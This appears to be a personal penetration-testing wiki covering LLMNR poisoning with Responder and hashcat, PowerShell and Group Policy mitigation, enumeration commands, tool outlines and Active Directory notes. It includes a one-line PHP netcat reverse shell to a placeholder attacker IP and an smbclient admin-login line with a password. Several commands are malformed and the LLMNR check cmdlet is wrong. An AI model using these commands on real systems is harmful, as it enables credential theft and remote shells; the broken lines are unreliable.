**Please note**
> [!IMPORTANT]
> This is a public wiki.
---

# Wiki Home
> [!NOTE]
> This Wiki covers a range of technical topics that you can check in the `README.md` page: https://github.com/asktechsupport/help/tree/main/wiki
>
> Code is available from the code repo https://github.com/asktechsupport/help

# Penetration Testing Wiki
## 5 stages of ethical hacking - diagram
![image](https://github.com/user-attachments/assets/1d12b895-29e8-475c-bce1-2ce10e282ff1)

### Active Directory Vulnerabilities
#### LLMNR Poisoning - How to attack

Step1️⃣ Run Responder
```
python /usr/share/responder/Responder.py -I tun0 -rdw -v
```
```
sudo -I responder -| tun0 -dwP
```
<details>
<summary>Step 2️⃣</summary>

![image](https://github.com/user-attachments/assets/03f0db35-7e69-4550-9475-c26ea73d9220)

</details>

<details>
<summary>Step 3️⃣A hash will come through, like the screenshot:  </summary>


![image](https://github.com/user-attachments/assets/c3d1f545-3fa3-4e1a-a8ef-d58ff393fd11)

</details>

<details>
<summary>Step 4️⃣ Using hashcat, if the password is weak enough we can crack it:  </summary>


![image](https://github.com/user-attachments/assets/4994fc78-8e58-41dc-a8e3-ba13ae48e118)

```
hashcat -m 5600 hashes.txt rockyou.txt
```
</details>


#### LLMNR Poisoning - Mitigation
---
To mitigate the LLMNR (Link-Local Multicast Name Resolution) poisoning vulnerability in an Active Directory environment, you can use PowerShell to disable LLMNR across your network. Here's how:

<details>
<summary>Steps to Mitigate LLMNR Poisoning</summary>

### Steps:

1. **Check the current status of LLMNR**  
   Use the following PowerShell command to verify whether LLMNR is enabled:
   ```powershell
   Get-NetAdapterBinding -ComponentID ms_lltdio
   ```

   If LLMNR is active, proceed to disable it.

2. **Disable LLMNR via Group Policy**  
   To effectively manage this setting across the network, it is recommended to apply it via Group Policy.

   Use PowerShell to configure the necessary registry settings to disable LLMNR:

   ```powershell
   # Set LLMNR to disabled in the registry
   Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -Value 0
   ```

   If the `EnableMulticast` key doesn't exist, create it:

   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast" -PropertyType DWord -Value 0
   ```

3. **Confirm the setting**  
   Verify that LLMNR is disabled:
   ```powershell
   Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name "EnableMulticast"
   ```

4. **Deploy via Group Policy** (Optional for multiple machines)  
   - Open the Group Policy Management Console (GPMC).
   - Navigate to `Computer Configuration > Administrative Templates > Network > DNS Client`.
   - Enable the setting **"Turn off multicast name resolution"**.
   ![image](https://github.com/user-attachments/assets/17d6b00b-70d9-4f66-a31a-dccd0553b127)

   Alternatively, use PowerShell to deploy a Group Policy Object (GPO) across your domain:
> [!NOTE]
> Add the link to the powershell document.
   ```powershell
   # Create a new GPO
   New-GPO -Name "Disable LLMNR"
   
   # Configure the GPO to disable LLMNR
   Set-GPRegistryValue -Name "Disable LLMNR" -Key "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -ValueName "EnableMulticast" -Type DWord -Value 0

   # Link GPO to a specific Organizational Unit (OU)
   New-GPLink -Name "Disable LLMNR" -Target <e.g.>"OU=<<<Computers>>>,DC=<<<YourDomain>>>,DC=co,DC=uk"
   ```

5. **Test and Validate**  
   After applying the changes, test to ensure that LLMNR is disabled and that no LLMNR traffic is observed. You can use a network monitoring tool like Wireshark to confirm that LLMNR queries (port 5355) are no longer broadcasted.

   **Deploy via Group Policy** (Optional for multiple machines)  
   - Open the Group Policy Management Console (GPMC).
   - Navigate to `Computer Configuration > Administrative Templates > Network > DNS Client`.
   - Enable the setting **"Turn off multicast name resolution"**.
   ![image](https://github.com/user-attachments/assets/17d6b00b-70d9-4f66-a31a-dccd0553b127)

</details>

By disabling LLMNR, you effectively reduce the risk of exploitation via LLMNR poisoning attacks in your Active Directory environment.
> [!TIP]
> If a company must use or cannot disable LLMNR, the best course of action is to:
>
> 1️⃣Require Network Access Control
> 
> 2️⃣Require Strong user passwords (greater than 14 characters)

### SMB Relay Vulnerabilities

### Gaining Shell Access Vulnerabilities

### IPv6 Vulnerabilities

### Passback Attacks

### Pass Attacks

### Kerberoasting

### Token Impersonation

### LNK File Attacks

### GPP/cPassword Attacks

### Mimikatz

### Golden Ticket Attacks

### ZeroLogon Attacks

### PrintNightmare (CVE-2021-1675)

### Active Directory Case Studies

### Domain Enumeration Tools
> [!NOTE]
> ldapdomaindump
>
> Bloodhound
> 
> Plumhound
>
> PingCastle

---

## **The Penetration Testing Lifecycle**
- Planning and Pre-Engagement
  - Scoping and Requirements
  - Threat Modeling
  - Attack Surface Analysis
- Reconnaissance
  - Passive Reconnaissance
  - Active Reconnaissance
  - OSINT Tools and Techniques
- Scanning and Enumeration
  - Network Mapping
  - Service Enumeration
  - Vulnerability Scanning
- Exploitation
  - Gaining Access
  - Privilege Escalation
  - Tools for Exploitation
- Post-Exploitation
  - Persistence
  - Lateral Movement
  - Data Exfiltration
- Reporting
  - Writing a Professional Report
  - Mitigation Recommendations

---

## **Reconnaissance Tools and Techniques**
- OSINT Tools
  - Maltego
  - theHarvester
  - SpiderFoot
  - Shodan
- Subdomain Enumeration
  - Amass
  - Sublist3r
- Google Dorking
  - Advanced Search Operators
- WHOIS and DNS Recon
  - dnsenum
  - DNSRecon

---

## **Scanning and Enumeration**
### Active Directory Enumeration

```
whoami /priv
```
- Network Scanning
  - Nmap
  - Masscan
- Web Application Scanning
  - Nikto
  - Burp Suite
- Service Enumeration
  - smbclient
  - enum4linux
  - rpcclient

### AV Enumeration
> [!NOTE]
> To query Windows Defender, use:
```
sc query windefend
```
> [!NOTE]
> To find out what AV is running, use:
```
sc queryex type= service
```
### Firewall Enumeration
> [!NOTE]
> To query the firewalls, use
```
netsh advfirewall firewall dump
```
```
netsh firewall show state
```
```
netsh firewall show config
```
---

## **5. Exploitation**
- Exploitation Frameworks
  - Metasploit
  - Cobalt Strike
  - Core Impact
- Vulnerability-Specific Exploits
  - SQLmap (SQL Injection)
  - Hydra (Brute Forcing)
  - Aircrack-ng (Wi-Fi Hacking)
- Scripting Exploits
  - Python and Bash Exploits
  - Custom Scripts for Exploitation

---

## **Post-Exploitation**
- Privilege Escalation
  - Windows Tools: WinPEAS, Mimikatz, PowerUp
  - Linux Tools: LinPEAS, GTFOBins
- Persistence Mechanisms
  - Scheduled Tasks
  - Startup Scripts
- Lateral Movement
  - PsExec
  - BloodHound
- Data Exfiltration
  - Netcat
  - Exfiltration Over DNS

---

## **Web Application Security**
- OWASP Top 10
- Common Web Vulnerabilities
  - SQL Injection
  - Cross-Site Scripting (XSS)
  - Cross-Site Request Forgery (CSRF)
  - Insecure Deserialization
- Web Security Tools
  - Burp Suite
  - OWASP ZAP
  - Wappalyzer

---

## **Wireless Penetration Testing**
- Wireless Attacks
  - WPA/WPA2 Cracking
  - Evil Twin Attacks
- Wireless Tools
  - Aircrack-ng Suite
  - Wireshark
  - Bettercap

---

## **Social Engineering**
- Techniques
  - Phishing
  - Vishing
  - Pretexting
- Tools
  - Gophish
  - SET (Social Engineering Toolkit)

---

## **Reporting and Documentation**
- Reporting Structure
  - Executive Summary
  - Technical Details
  - Proof of Concepts
- Risk Ratings
  - CVSS (Common Vulnerability Scoring System)
- Mitigation Strategies
  - Best Practices for Hardening

---
## **Vulnerabilities & Exploits**
- Windows Subsystem for Linux (WSL)
  - PayloadsAllTheThings

### Hackthebox machines
- [ ] Chatterbox
- [ ] SecNotes

## **Tools Cheat Sheet #cheatsheet**
- Reconnaissance Tools
  - theHarvester, Shodan, SpiderFoot
- Scanning Tools
  - Nmap, Nikto, Masscan
- Exploitation Tools
  - Metasploit, SQLmap, Hydra
- Post-Exploitation Tools
  - Mimikatz, LinPEAS, BloodHound
- Reporting Tools
  - Dradis Framework
### Exploiting SMB
```
smbclient -U 'administrator%u6!4zwgwOM#^0Bf#Nwhn' \\\\127..0.1\\c$
```

### Exploiting PHP
This is a basic reverse shell written in php 
```
<?php
system('nc.exe -e cmd.exe $yourip 4444')
?>
```
### Exploiting with exec tools
- psexpec.py
- smbexec.py
- wmiexec.py

### Exploiting with Shells
Spawning a TTY Shell - https://netsec.ws/?p=337

### impacket
https://github.com/SecureAuthCorp/impacket.git
```
cd /opt/
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket-0.9.19/
pip3 install.
```
> [!NOTE]
> The version number may change under the git clone line



### netcat and nmap
[Kioptrix Download](https://tcm-sec.com/kioptrix)

Nmap
```
arp-scan
```
SYN SYNACK ACK nmap
Stealth scanning
SYN SYNACK ACK nmap -sS
SYN SYNACK RST nmap -sS

```
nmap -T4 -P- -A
```
### OSINT & Recon Resources | Intelligence Lifecycle
![image](https://github.com/user-attachments/assets/f3dcb343-e338-470e-ae98-d0b64fb11196)
https://blog.reknowledge.tech/blog/osnt-analyst-replaced-by-automation
PLANNING & DIRECTION >> COLLECTION >> PROCESSING AND EXPLOITATION >> ANALYSIS AND PRODUCTION >> DISSEMINATON AND INTEGRATION

### OSINT & Recon Resources | Google Fu
* Google, lmgtfy,
* site:<domain>
* site:tesla.com -www
* filetype:csv

### OSINT & Recon Resources | email addresses
* hunter.io
* Phonebook.cz
* Clearbit
* email-checker.net
* emailhippo.com

### OSINT & Recon Resources | hashes
* hashes.org

### OSINT & Recon Resources | hunting subdomains and website technologies
* sublist3r
* owasp amass
  
* wappalyzer (Firefox)
* burpsuite [https://burp](https://burp) - Kali
* 

### github
[hmaverickadams | breach-parse | github.com](https://github.com/hmaverickadams/breach-parse)



---

## **Resources #resources**
- Recommended Courses
  - TCM Academy (PNPT, OSINT, Practical Ethical Hacking)
- Practice Labs
  - TryHackMe
  - Hack The Box
  - VulnHub
- Books
  - "The Hacker Playbook"
  - "Red Team Field Manual"
  - "Metasploit: The Penetration Tester’s Guide"
- https://github.com/swisskyrepo/PayloadsAllTheThings

**Links to further reading and tools.**

- [Microsoft Documentation](resources#microsoft-documentation)
- [PowerShell Modules](resources#powershell-modules)
- [Useful Tools for IT Admins](resources#useful-tools)
---

# FAQ

Answers to commonly asked questions.

- [What happens if a DC goes offline?](faq#dc-offline)
- [How to fix Group Policy not applying?](faq#group-policy-fix)

---

# Group Policy & Windows Registry Wiki
How to configure and manage Group Policies.

## Reg key locations
**Hosts file**
```
c:\Windows\System32\Drivers\etc\hosts
```

---

## Windows Active Directory Wiki

Key concepts and architecture of Active Directory.

---

### Active Directory - Common Issues

Guide to resolving frequently encountered problems.


---

### Active Directory - User Management in Active Directory

Best practices for managing users and groups.

---

### Active Directory - Security and Permissions

Securing your environment and managing permissions.


---

### Active Directory - Backup and Recovery

Preparing for and recovering from disasters.

---

### Active Directory - Active Directory Federation Services (ADFS)


### Active Directory - Active Directory Certificate Services (ADCS)


### Active Directory - Azure AD Integration

### AD CS (Active Directory Certificate Services)
Key functions of AD CS
* Integration with Active Directory: AD CS integrates with Microsoft’s PKI implementation within Active Directory to facilitate the issuance of certificates for X.509-formatted documents, encryption, message signing, and authentication.
* Certificate Authority (CA): Certificates are issued by Certificate Authority (CA). CAs bind an identity to a public/private key pair, which is then utilized by applications to verify user identity.
* Private/Public Key Generation: The client generates a private key pair. The public key is included in a Certificate Signing Request (CSR) along with details like subject and template name.
* Certificate Signing Request (CSR): The CSR, which includes the public key and other details necessary for certificate generation, is sent to the Enterprise CA server.
Verification by CA Server: The Enterprise CA server verifies the client’s permissions and template settings. It ensures the client is permitted to request the certificate based on the provided template settings.
* Certificate Generation: If the client’s request is permitted, the CA generates a certificate based on the template settings. The certificate is signed with the CA’s private key.
* Certificate Issuance: The signed certificate is returned to the client, who can now use the certificate for secure communications, authentication, and other cryptographic operations.
* object identifiers (OIDs) [PKI Solutions provides a comprehensive list of the EKU OIDs offered by Microsoft](https://www.pkisolutions.com/object-identifiers-oid-in-pki/).
* ESC1 attacks: and [Read on ESC1 attacks](https://www.beyondtrust.com/blog/entry/esc1-attacks) and Certipy: [certipy tool](https://github.com/ly4k/Certipy)

## PenTesting | Tools

### Active Directory
AD Components
* Domain Controllers
* AD DS Data Store
* NTDS.dit
* Forests
  Trees, Trusts,
* Trusts: Directional, Transitive
* Organisational Units (OUs)
* Schema

* Class Objects
* Attribute Objects

#### AD Objects:
User Objects: enable network resource access for a user

InetOrgPerson: Simlar to a user account, used for compatibility with other directory services

Contacts: Used primarily to assign e-mail addresses to external users, Does not enable network access

Groups: Used to simplify the administration of access control

Computers: Enables auth and auditing of computer access to resources

Printers: Used to simplify the process of locating an connecting to printers

Shared folders: Enables users to search for shared folders based on properties

Certificates: A certificate on a server is like an ID card for a website. It shows that the website is legitimate and helps ensure that your information is safe when you visit it.
When you go to a website, this certificate lets your browser know that it’s talking to the real site and not an imposter. It also helps to encrypt any data you share, like passwords or credit card numbers, so that only the website can read it. In short, it’s a way to build trust and keep your online activities secure.
![image](https://github.com/user-attachments/assets/395a225c-48a7-4bc1-b659-5f2b8a6efc9e)

credit: [https://www.beyondtrust.com/blog/entry/esc1-attacks](https://www.beyondtrust.com/blog/entry/esc1-attacks)


#### Build a lab in Azure
[Build a lab in Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)



